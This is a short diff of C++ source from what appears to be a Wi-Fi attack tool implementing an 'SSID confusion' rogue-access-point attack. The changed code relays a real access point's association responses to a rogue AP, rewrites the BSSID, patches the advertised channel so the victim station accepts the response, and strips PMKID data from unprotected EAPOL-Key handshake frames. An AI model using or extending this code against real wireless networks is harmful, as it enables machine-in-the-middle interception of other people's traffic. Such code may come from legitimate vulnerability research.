@@ -10,8 +10,8 @@ using namespace std;
 using namespace std::chrono;
 
 //TODO test
-// Strip PMKID KDE (DD 14 00 0F AC 04 + 16B) from EAPOL-Key msg1 key data.
-// Msg1 has no MIC, so key data is unprotected plaintext — no key material needed.
+// Strip PMKID KDE (DD 14 00 0F AC 04 + 16B) from EAPOL-Key msg1 key dat.
+// Msg1 has no MIC -> key data is unprotected plaintext
 static bool strip_pmkid_kde(frame_raw_t &raw) {
     static constexpr uint8_t snap_eapol[] = {0x88, 0x8e};
 	const auto snap = ranges::search(raw, snap_eapol).begin();
@@ -124,10 +124,17 @@ void SsidConfusion::handle_rx_real_chan(const std::unique_ptr<PDU> &pdu, const f
 	// relay real AP assoc response back to STA (rewrite BSSID so STA accepts it)
 	if(dot11->find_pdu<Dot11AssocResponse>() || dot11->find_pdu<Dot11ReAssocResponse>()) {
 		if(addr1 == HWAddress<6>(sta.get(SK::mac)) && client_state.get_state() >= ClientState::Associated) {
-			auto relayed = ensure_radiotap(raw);
-			rewrite_bssid_in_frame(relayed, rogue_ap.get(SK::mac));
 			display_traffic(*dot11, "Real channel", " assoc resp -- relay to rogue");
-			send_to_rogue(relayed);
+			if(const auto *ar = dot11->find_pdu<Dot11AssocResponse>()) {
+				const unique_ptr<Dot11AssocResponse> patched(assoc_resp_channel_patch(*ar, netconfig.rogue_channel));
+				auto relayed = ensure_radiotap(patched->serialize());
+				rewrite_bssid_in_frame(relayed, rogue_ap.get(SK::mac));
+				send_to_rogue(relayed);
+			} else {
+				auto relayed = ensure_radiotap(raw);
+				rewrite_bssid_in_frame(relayed, rogue_ap.get(SK::mac));
+				send_to_rogue(relayed);
+			}
 		}
 		return;
 	}
